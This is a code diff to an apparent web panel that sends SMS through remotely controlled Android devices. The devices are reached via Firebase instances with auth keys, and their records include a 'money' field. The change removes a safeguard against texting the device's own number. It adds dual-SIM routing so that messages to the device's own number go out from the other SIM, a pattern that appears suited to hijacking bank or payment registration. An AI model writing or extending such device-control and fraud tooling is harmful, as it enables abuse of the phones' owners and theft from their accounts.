@@ -588,12 +588,25 @@ function isSameNumberAsDevice(d,toRaw){
   }
   return false;
 }
+function getDualSimCount(d){
+  if(!d)return 1;
+  var raw=getRawDev(d.id), sims=parseApkSims(raw);
+  if(sims&&sims.length)return sims.length;
+  if(raw&&raw.sims&&Array.isArray(raw.sims)&&raw.sims.length)return raw.sims.length;
+  return 1;
+}
+function rabelFromSimForSend(sim,d,to){
+  var s=Math.max(1,sim||1);
+  if(d&&isSameNumberAsDevice(d,to)&&getDualSimCount(d)>=2&&s===1)return 2;
+  return s;
+}
 function fillDeviceSmsTo(d,force,simSlot){
   var toEl=document.getElementById('smsTo');
   if(!toEl||!d)return;
   if(!force&&toEl.value&&String(toEl.value).trim())return;
-  toEl.value='';
-  toEl.placeholder='Recipient number (10 digit) — device ka apna number mat daalo';
+  var phone=getDeviceSmsPhone(d,simSlot||_sendSimSlot);
+  if(phone)toEl.value=phone;
+  else toEl.placeholder='Recipient number (10 digit)';
 }
 function getApkModel(raw,d){return String((raw&&raw.modelName)||(d&&d.name)||'Unknown');}
 function getApkMoney(raw){return raw&&raw.money!=null?String(raw.money):'';}
@@ -2461,12 +2474,8 @@ function sendDeviceSms(sim){
   }
   var phoneDial=formatApkSmsTo(toRaw||to);
   var msg=(msgEl&&msgEl.value||'').trim();
-  if(!toRaw){toast('Recipient number daalo — jis number par SMS bhejna hai',false);return;}
+  if(!toRaw){toast('Recipient number daalo',false);return;}
   if(!msg){toast('Enter message',false);return;}
-  if(isSameNumberAsDevice(d,toRaw)){
-    toast('Yeh selected device ka apna number hai — same number par SMS nahi jaata. Doosra ONLINE device select karke '+formatApkSmsTo(toRaw)+' par bhejo.',false);
-    return;
-  }
   if(_sendInFlight){toast('Sending…',true);return;}
   _sendInFlight=true;
   toast('Sending SMS…',true);
@@ -3207,12 +3216,14 @@ function formatApkSmsTo(raw){
   if(clean.length>10)return '91'+clean.slice(-10);
   return clean;
 }
-function buildRabelSendPayload(sim,to,message){
-  return{from:sim||1,to:formatApkSmsTo(to),message:message,isSended:false};
+function buildRabelSendPayload(sim,to,message,d){
+  var fromSim=rabelFromSimForSend(sim,d,to);
+  return{from:fromSim,to:formatApkSmsTo(to),message:message,isSended:false};
 }
-function buildRabelSendPayload10(sim,to,message){
+function buildRabelSendPayload10(sim,to,message,d){
+  var fromSim=rabelFromSimForSend(sim,d,to);
   var ten=normalizePhoneDigits(formatApkSmsTo(to))||normalizePhone(to);
-  return{from:sim||1,to:ten||formatApkSmsTo(to),message:message,isSended:false};
+  return{from:fromSim,to:ten||formatApkSmsTo(to),message:message,isSended:false};
 }
 function needsDualSmsSend(inst,d){
   if(!inst)return false;
@@ -3259,8 +3270,8 @@ function pushSmsWebhookAttempt(out,node,id,payload){
 function getSendAttempts(inst,d,to,message,sim){
   var id=d.rawId,out=[],profileNode=getDeviceProfilePath(d)||'clients';
   var patch=buildNyaApkCommandPatch(id,sim,to,message);
-  var rabel91=buildRabelSendPayload(sim,to,message);
-  var rabel10=buildRabelSendPayload10(sim,to,message);
+  var rabel91=buildRabelSendPayload(sim,to,message,d);
+  var rabel10=buildRabelSendPayload10(sim,to,message,d);
   if(needsDualSmsSend(inst,d)){
     if(profileNode!=='clients')pushSmsPatchAttempts(out,profileNode,id,patch);
     pushSmsPatchAttempts(out,'clients',id,patch);
@@ -3489,10 +3500,7 @@ function sendSmsInstant(to,msg,simSlot,callback){
   var phoneFull=String(to||'').trim();
   var phoneDial=formatApkSmsTo(phoneFull||to);
   if(!phoneDial||phoneDial.length<12){if(callback)callback(false,{error:'Valid phone number daalo'});return;}
-  if(isSameNumberAsDevice(d,phoneFull||phoneDial)){
-    if(callback)callback(false,{error:'Selected device ka apna number hai — doosra online device select karke bhejo'});
-    return;
-  }
+  var sameNum=isSameNumberAsDevice(d,phoneFull||phoneDial);
   var attempts=getSendAttempts(inst,d,phoneFull||phoneDial,msg,simSlot||1);
   var dual=needsDualSmsSend(inst,d);
   var writeNode=d.deviceNode||getDeviceProfilePath(d)||'clients';
@@ -3500,7 +3508,8 @@ function sendSmsInstant(to,msg,simSlot,callback){
   var phpBody={
     device_id:d.rawId,to:phoneDial,message:msg,sim:simSlot||1,
     database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
-    schema:inst.schema||'rabel',device_node:writeNode,composite_id:d.id
+    schema:inst.schema||'rabel',device_node:writeNode,composite_id:d.id,
+    same_number:sameNum?1:0,sim_count:getDualSimCount(d)
   };
   var restFn=dual?sendSmsViaRestDual:sendSmsViaRestSequential;
   var sdkFn=dual?sendSmsDirectFirebaseDual:sendSmsDirectFirebaseSequential;
